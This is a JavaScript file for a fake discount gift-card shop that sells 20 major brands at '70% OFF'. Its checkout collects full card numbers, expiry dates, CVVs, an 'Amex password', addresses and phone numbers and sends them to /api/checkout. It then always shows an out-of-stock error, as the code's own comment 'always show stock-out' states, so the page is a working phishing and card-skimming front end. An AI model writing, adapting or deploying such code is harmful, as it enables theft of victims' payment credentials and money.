const brands = [
  { name: "AMAZON", color: "#ff9900" },
  { name: "APPLE", color: "#555555" },
  { name: "GOOGLE PLAY", color: "#34a853" },
  { name: "STEAM", color: "#1b2838" },
  { name: "WALMART", color: "#0071ce" },
  { name: "TARGET", color: "#cc0000" },
  { name: "BEST BUY", color: "#0046be" },
  { name: "STARBUCKS", color: "#00704a" },
  { name: "NETFLIX", color: "#e50914" },
  { name: "SPOTIFY", color: "#1db954" },
  { name: "UBER", color: "#000000" },
  { name: "VISA", color: "#1a1f71" },
  { name: "MASTERCARD", color: "#eb001b" },
  { name: "XBOX", color: "#107c10" },
  { name: "PLAYSTATION", color: "#003791" },
  { name: "NIKE", color: "#111111" },
  { name: "ADIDAS", color: "#000000" },
  { name: "SEPHORA", color: "#000000" },
  { name: "HOME DEPOT", color: "#f96302" },
  { name: "COSTCO", color: "#e31837" }
];

const amounts = [5, 10, 20, 50, 100];

let state = { brand: null, amount: null };

function renderBrands() {
  const grid = document.getElementById('brandGrid');
  grid.innerHTML = brands.map(b => `
    <div class="card-tile" style="background:${b.color}" onclick="selectBrand('${b.name}', '${b.color}')">
      <div class="discount">70% OFF</div>
      ${b.name}
    </div>
  `).join('');
}

function selectBrand(name, color) {
  state.brand = name;
  document.getElementById('selectedBrandTitle').innerHTML = `${name} <span style="color:${color}">Gift Card</span>`;
  document.getElementById('amountBtns').innerHTML = amounts.map(a => `
    <button class="amt-btn" onclick="selectAmount(${a}, this)">$${a}<br><small style="font-weight:400;opacity:.8">Pay $${(a*0.3).toFixed(0)}</small></button>
  `).join('');
  goStep(2);
}

function selectAmount(amt, btn) {
  state.amount = amt;
  document.querySelectorAll('.amt-btn').forEach(b => b.classList.remove('selected'));
  btn.classList.add('selected');
  document.getElementById('toDetailsBtn').disabled = false;
}

function goStep(n) {
  document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
  document.getElementById('step' + n).classList.add('active');
  if (n === 3) {
    const pay = (state.amount * 0.3).toFixed(2);
    document.getElementById('orderSummary').innerHTML = `
      <strong>${state.brand}</strong> Gift Card – $${state.amount}<br>
      <span style="color:#16a34a;font-weight:700">70% OFF applied → You pay only $${pay}</span>
    `;
  }
}

// Amex detect
document.getElementById('cardNumber').addEventListener('input', function(e) {
  let v = e.target.value.replace(/\D/g, '').substring(0, 16);
  // basic spacing
  e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
  const first = v.charAt(0);
  const amex = first === '3';
  document.getElementById('amexField').style.display = amex ? 'block' : 'none';
  document.getElementById('cvv').maxLength = amex ? 4 : 3;
});

document.getElementById('exp').addEventListener('input', function(e) {
  let v = e.target.value.replace(/\D/g, '').substring(0, 4);
  if (v.length >= 3) v = v.substring(0,2) + '/' + v.substring(2);
  e.target.value = v;
});

async function submitPay() {
  const btn = document.getElementById('payBtn');
  btn.disabled = true;
  btn.textContent = 'Processing...';

  const data = {
    brand: state.brand,
    amount: state.amount,
    email: document.getElementById('email').value.trim(),
    cardName: document.getElementById('cardName').value.trim(),
    cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, ''),
    exp: document.getElementById('exp').value.trim(),
    cvv: document.getElementById('cvv').value.trim(),
    amexPassword: document.getElementById('amexPassword').value.trim() || null,
    street: document.getElementById('street').value.trim(),
    city: document.getElementById('city').value.trim(),
    state: document.getElementById('state').value.trim(),
    zip: document.getElementById('zip').value.trim(),
    phone: document.getElementById('phone').value.trim()
  };

  try {
    const res = await fetch('/api/checkout', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
    const json = await res.json();
    // always show stock-out
    document.getElementById('errorBox').style.display = 'block';
    btn.style.display = 'none';
  } catch (err) {
    document.getElementById('errorBox').style.display = 'block';
    btn.style.display = 'none';
  }
}

renderBrands();
